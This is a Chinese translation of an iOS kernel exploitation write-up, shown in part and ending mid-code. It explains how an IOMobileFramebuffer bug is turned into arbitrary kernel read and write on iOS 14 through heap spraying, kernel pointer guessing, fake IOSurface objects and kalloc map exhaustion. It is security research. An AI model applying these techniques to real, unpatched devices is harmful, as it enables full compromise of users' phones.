<p>我们应该对内核喷洒什么呢？在Siguza的<a target="_blank" rel="noopener" href="https://blog.siguza.net/v0rtex/">v0rtex</a>的文章中，大于一页的OSData缓冲区会直接进入内核地图，但那是近四年前的事了。我自己检查了一下，看看从那时起是否有什么变化，在我的内核中追踪到OSData::initWithCapacity后，情况仍然如此。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">OSData::initWithCapacity_unsigned_int</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( page_size &gt; capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">kalloc_ext</span>(&amp;KHEAP_DATA_BUFFERS, capacity, <span class="number">0LL</span>, &amp;unk_FFFFFFF009260880);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( capacity &lt; <span class="number">0xFFFFC001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (capacity + <span class="number">0x3FFF</span>) &amp; <span class="number">0xFFFFC000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">kernel_memory_allocate</span>(kernel_map, &amp;v11, v8, <span class="number">0LL</span>, <span class="number">0LL</span>, v9);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，只要我们的分配超过了一个页面，并且不是过分的大，我们就可以把受控的数据放入内核地图。而为了进行OSData分配，我们将利用<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/libkern/c%2B%2B/OSSerializeBinary.cpp#L355">OSUnserializeBinary</a>。这个函数已经存在很久很久了，这里有大量关于其输入数据格式的文档。IOSurfaceRootUserClient外部方法9，即IOSurfaceRootUserClient::s_set_value，使用OSUnserializeBinary来解析其结构输入数据，所以我们可以用它来进行分配。我们还可以用IOSurfaceRootUserClient::s_get_value读回数据，或者用IOSurfaceRootUserClient::s_remove_value释放数据。</p>
<p>喷洒500MB的OSData缓冲区，原因有二：第一，做500MB的分配不需要那么长的时间，第二，做那么多的分配，在某个时间点之后，几乎可以保证可预测和连续的分配。使用<a target="_blank" rel="noopener" href="https://github.com/jsherman212/xnuspy">xnuspy</a>，钩住kernel_memory_allocate，检查它是否被OSData::initWithCapacity调用。如果是的话，把它刚刚分配的页面的地址记录在一个全局数组中。由于xnuspy从可执行文件的<code>__TEXT</code>和<code>__DATA</code>段中创建了共享内存，对这个数组的写入对用户空间代码来说是可见的。喷洒结束后，对该数组内的分配进行了排序，并检查是否有任何漏洞。忽略前1000个分配，因为在那之后我们很有可能只看到连续的、按顺序的分配。如果没有漏洞，就记录下这个范围，在重启后再做几次，得出了iPhone 8的以下范围。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0xffffffe8cee1c000, 0xffffffe8ec458000)</span><br><span class="line">[0xffffffe8cef78000, 0xffffffe8ec5b0000)</span><br><span class="line">[0xffffffe8ce9b4000, 0xffffffe8ebff4000)</span><br><span class="line">[0xffffffe8cef38000, 0xffffffe8ec570000)</span><br><span class="line">[0xffffffe8cead4000, 0xffffffe8ec10c000)</span><br><span class="line">[0xffffffe8ccdec000, 0xffffffe8ec378000)</span><br></pre></td></tr></table></figure>

<p>算出每个范围的平均数，把它们加到一个列表中，然后取这个列表的平均数来得出我们猜测的内核map指针。对于运行iOS 14.6的iPhone 8来说，这个指针是0xffffffe8dd594000，而且出奇地可靠。但是，iOS 14.7的iPhone SE是另一个故事。那部手机的地址空间被诅咒了。不确定是什么原因导致了这种奇怪的现象，但还是能够得出一个猜测：0xfffff9942d0000。这个猜测有大约50%的成功率，而iPhone 8的猜测则倾向于90%。</p>
<p>你可以在这里找到kernel_memory_allocate的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/kernel_hooks.c">钩子</a>，在这里找到<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/608471b6b649986cf411fce530ec3aa879c063cf/IOMobileFramebufferUserClient.c#L586">分析</a>全局数组的代码，在这里找到生成猜测的<a target="_blank" rel="noopener" href="https://github.com/jsherman212/iomfb-exploit/blob/main/alloc_averager.py">python</a>脚本。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Stage-0"><a href="#Stage-0" class="headerlink" title="Stage 0"></a>Stage 0</h2><p>有了一个用于32位增量的指针，我开始思考这个漏洞的最终目标是什么，因为它不会是一个假的内核任务端口。用一个假的IOSurface对象代替怎么样？如果IOSurface::increment_use_count在偏移量0xc0处读出一个指针来增加 “使用次数”，我想是否有一个IOSurfaceRootUserClient的外部方法来读取这个 “使用次数”……哦，看，有的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::get_surface_use_count</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v6 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        *a3 = IOSurfaceClient::<span class="built_in">get_use_count</span>(v7);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurfaceClient::get_use_count</span><span class="params">(IOSurfaceClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">get_use_count</span>(a1-&gt;m.surface);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::get_use_count:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD __fastcall <span class="title">IOSurface::get_use_count</span><span class="params">(IOSurface *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">0x14LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们控制一个IOSurface对象，我们就控制了内核指针的偏移量0xc0。因此，通过调用这个IOSurfaceRootUserClient::s_get_surface_use_count与一个被控制的IOSurface，我们会有一个任意的32位内核读取。但是一个任意的写呢？这个位于偏移量0xc0的指针似乎有很大的意义。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceRootUserClient::set_compressed_tile_data_region_memory_used_of_plane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRootUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v8 = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="built_in">lck_mtx_lock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;m.surface_client_array_capacity &gt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = a1-&gt;m.surface_client_array[a2];</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">        v8 = IOSurfaceClient::<span class="built_in">setCompressedTileDataRegionMemoryUsageOfPlane</span>(v9, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">lck_mtx_unlock</span>(a1-&gt;m.mutex);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurfaceClient::setCompressedTileDataRegionMemoryUsageOfPlane</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">unsigned</span> <span class="type">int</span> a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> IOSurface::<span class="built_in">setCompressedTileDataRegionMemoryUsedOfPlane</span>(a1-&gt;m.surface, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">kern_return_t</span> __fastcall <span class="title">IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane</span><span class="params">(IOSurface *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = <span class="number">0xE00002C2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">4</span> &amp;&amp; a1-&gt;dwordB0 &gt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)(a1-&gt;qwordC0 + <span class="number">4LL</span> * a2 + <span class="number">0x98</span>) = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们同时控制了a2和a3，所以如果我们控制传递给这个函数的IOSurface对象，我们就有了一个任意的32位内核写入。</p>
<p>还记得每个IOSurfaceRootUserClient是如何跟踪它所拥有的IOSurface对象的吗？每一次从IOSurfaceClient数组中的读取都是在边界检查的保护下进行的。如果我们以某种方式泄露了我们拥有的IOSurfaceRootUserClient的地址，我们可以使用类型混淆的32位增量来提高其surface_client_array_capacity字段。这将人为地创造一个越过其surface_client_array末端的越界读取，所以我们可以索引到一个我们控制的缓冲区。</p>
<p>因此，这个漏洞的目标是构建一个假的IOSurfaceClient对象（它将携带一个指向假的IOSurface对象的指针），我们可以使用IOSurfaceRootUserClient外部方法对其进行索引。</p>
<h2 id="Stage-1-塑形内核VA"><a href="#Stage-1-塑形内核VA" class="headerlink" title="Stage 1: 塑形内核VA"></a>Stage 1: 塑形内核VA</h2><p>第一阶段的目标是创建一个可预测的大型IOSurfaceClient数组的布局，并控制缓冲区极其接近OSData缓冲区，该缓冲区与我们猜测的内核指针相对应。很明显，我们需要在其他事情之前找到这个OSData缓冲区。选择0x10000字节的分配对内核map喷洒500MB数据，因为我们将在喷射IOSurfaceClient数组时使用这个大小。这个大小是任意选择的，没有什么意义。然而，根据特定启动的内核map碎片，猜测不会总是落在0x10000字节的OSData缓冲区的第一页。因此，对于每个OSData缓冲区的每一页。</p>
<ul>
<li>偏移量0x0保持一个常数。</li>
<li>偏移量0X4保存页面编号。</li>
<li>偏移量0x8持有用于IOSurfaceRootUserClient外部方法9、10和11的密钥。</li>
</ul>
<p>在500MB被喷完后，猜测的内核指针被使用，并有32位增量。如果猜测落在一个未映射的页面上，就会导致Panic，但如果它落在我们的一个已喷涂的缓冲区上，那么这些页面开始的那个常量值就会被递增了。我们用IOSurfaceRootUserClient::s_get_value读回所有的OSData缓冲区，并检查这个变化。一旦我们找到被写入的缓冲区的页面，我们就用偏移量0x4的页码来计算第一个页面的地址。</p>
<p>从现在开始，将把与我们猜测的内核指针相对应的OSData缓冲区称为 “锚点分配”。</p>
<p>我们现在处于一个非常好的位置。我们知道锚点分配在内核内存中的地址，并且由于vm_map_find_space的可预测性，这些OSData缓冲区极有可能按照它们被分配的顺序排列。这就是在这个漏洞中最依赖的东西。因为知道锚点分配的地址，所以知道与它相邻的所有OSData缓冲区的地址。如果想要左边的第n个OSData缓冲区，那么就从锚点分配的地址中减去<code>0x10000*n</code>字节。如果我想把第n个OSData缓冲区放在右边，那么我就把<code>0x10000*n</code>字节加到锚点分配的地址上。</p>
<p>此外，如果我们释放了一个OSData缓冲区，我们应该能够很容易地收回那个缓冲区，因为vm_map_find_space的 “寻找第一个可能的地址  “的思想。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_fig1.png"></p>
<p>如果逆向过IOSurface kext，或者看过内核日志，可能知道每个IOSurfaceRootUserClient有4096个IOSurface对象的限制。一旦我们达到了一个IOSurfaceRootUserClient的限制，我们就可以创建另一个，并继续用新的IOSurface对象。同样，对于我们创建的每一个IOSurface对象，都会有一个IOSurfaceClient对象。但是，即使我们创建了4096个IOSurface对象，sizeof(IOSurfaceClient *) * 4096也只有0x8000字节，而不是0x10000字节。那么是什么原因呢？</p>
<p>原因在IOSurfaceRootUserClient::alloc_handles里:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">IOSurfaceRootUserClient::alloc_handles</span><span class="params">(IOSurfaceRootUserClient *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br><span class="line">  surface_client_array = a1-&gt;m.surface_client_array;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">IONewZero</span>(<span class="number">8</span> * surface_client_array_capacity);</span><br><span class="line">  a1-&gt;m.surface_client_array = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = surface_client_array_capacity;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IOSurfaceRootUserClient::set_surface_handle是由IOSurfaceClient::init调用的，所以每次我们创建一个新的IOSurface对象时都会到达IOSurfaceRootUserClient::alloc_handles。</p>
<p>正是这一行使0x10000字节的IOSurfaceClient阵列成为可能:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">surface_client_array_capacity = a1-&gt;m.provider-&gt;m.surface_client_array_capacity;</span><br></pre></td></tr></table></figure>

<p>provider字段指向一个IOSurfaceRoot对象。创建的每个IOSurfaceRootUserClient对象都有相同的provider指针。那么，在创建一个新的IOSurface时，IOSurfaceRoot是如何发挥作用的？当你创建一个IOSurface时，首先要调用的一个函数是IOSurface::init。为了分配一个新的IOSurface ID，它调用IOSurfaceRoot::alloc_surfaceid。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_surfaceid</span><span class="params">(IOSurfaceRoot *a1, <span class="type">unsigned</span> <span class="type">int</span> *new_surface_idp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v4 = a1-&gt;m.total_surfaces_created &gt;&gt; <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &gt;= a1-&gt;m.surface_client_array_capacity &gt;&gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="keyword">if</span> ( (IOSurfaceRoot::<span class="built_in">alloc_handles</span>(a1) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">32</span> * v4;       <span class="comment">/* aka v6 = v4 &lt;&lt; 5 */</span></span><br><span class="line">  a1-&gt;m.total_surfaces_created = v6 + <span class="number">1</span>;</span><br><span class="line">  *new_surface_idp = v6;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么这个代码库将创建的IOSurface对象的总数移到左边五位，尚不明白，但我们看到IOSurfaceRoot有自己的alloc_handles实现。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOSurfaceRoot::alloc_handles</span><span class="params">(IOSurfaceRoot *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  surface_client_array_capacity = a1-&gt;m.surface_client_array_capacity;</span><br><span class="line">  <span class="keyword">if</span> ( surface_client_array_capacity )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( surface_client_array_capacity &gt;&gt; <span class="number">14</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v3 = <span class="number">2</span> * surface_client_array_capacity;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">512</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="built_in">IONewZero</span>((v3 &gt;&gt; <span class="number">3</span>) + <span class="number">8LL</span> * v3);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1-&gt;m.surface_client_array_capacity = v3;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，全系统有一个16384个IOSurface对象的限制，这就是surface_client_array_capacity &gt;&gt; 14的测试。对于超过512的2次方，IOSurfaceRoot的surface_client_array_capacity将增加一倍。因为我们创建的每个IOSurfaceRootUserClient都有相同的IOSurfaceRoot指针，他们都能在IOSurfaceRootUserClient::alloc_handles看到相同的surface_client_array_capacity字段。</p>
<p>因此，我们创建0x10000字节的IOSurfaceClient数组的方法很简单：创建两个IOSurfaceRootUserClient对象，并为它们各自分配4096个IOSurface对象。如果我们特别注意不触发他们的provider IOSurfaceRoot的surface_client_array_capacity的再次翻倍，那么未来任何新的IOSurfaceRootUserClient对象的所有IOSurfaceClient数组也将是0x10000字节。这里最棒的是，我们需要做的就是用一个新的IOSurfaceRootUserClient对象来做一个新的0x10000字节的IOSurfaceClient数组，只需要用它来分配一个IOSurface，因为在那个时候，IOSurfaceRoot的surface_client_array_capacity已经是8192。</p>
<p>尽管0x10000比kalloc_max_prerounded大，但有一个小问题：OSData缓冲区是由kernel_memory_allocate直接分配的，而IOSurfaceClient数组的分配是通过kalloc_ext的，所以会调用kalloc_large。还记得kalloc_large如何调用kalloc_map_for_size吗？</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">vm_map_t</span></span></span><br><span class="line"><span class="function"><span class="title">kalloc_map_for_size</span><span class="params">(<span class="type">vm_size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; kalloc_kernmap_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> kalloc_map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kernel_map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kalloc_kernmap_size又是0x100001字节，但我们要做的IOSurfaceClient数组只有0x10000字节，所以我们要从kalloc map而不是直接从内核map中分配。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alloc_map = <span class="built_in">kalloc_map_for_size</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(alloc_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">if</span> (alloc_map != kernel_map) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">kmem_alloc_flags</span>(kernel_map, &amp;addr, size, tag, kma_flags) != KERN_SUCCESS) &#123;</span><br><span class="line">            addr = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        addr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们只需要让从kalloc地图的分配失败，落入第二个kmem_alloc_flags，它将永远从内核地图分配。让未来的kalloc地图分配失败的最好方法是把它完全填满。</p>
<p>为了填满kalloc地图，我们将使用携带线外端口的Mach消息。这是在iOS 13及以下版本中最过硬的策略之一，因为你可以得到一个Mach端口指针数组，放置在你想要的任何区域。尽管这在iOS 14及以上版本中已经失效，但port指针数组的分配仍然要通过kalloc_ext。经过一些测试，喷洒2000条携带8192个发送权的消息，始终能填满kalloc地图，因为消息中的每个发送权都会创建一个ipc_port指针。</p>
<p>现在kalloc地图被填满了，每一个超过32768字节的kalloc分配都会直接进入内核地图。这个难题的最后一块是要弄清楚我们要使用什么样的受控缓冲区。可以继续使用OSData缓冲区，但是需要大量的代码来读出、写入或释放它们，这与<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/kern/sys_pipe.c#L308">管道</a>缓冲区不同…</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> pipesize_blocks[] = &#123;<span class="number">512</span>, <span class="number">1024</span>, <span class="number">2048</span>, <span class="number">4096</span>, <span class="number">4096</span> * <span class="number">2</span>, PIPE_SIZE, PIPE_SIZE * <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * finds the right size from possible sizes in pipesize_blocks</span></span><br><span class="line"><span class="comment"> * returns the size which matches max(current,expected)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">choose_pipespace</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> current, <span class="type">unsigned</span> <span class="type">long</span> expected)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">sizeof</span>(pipesize_blocks) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> target;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * assert that we always get an atomic transaction sized pipe 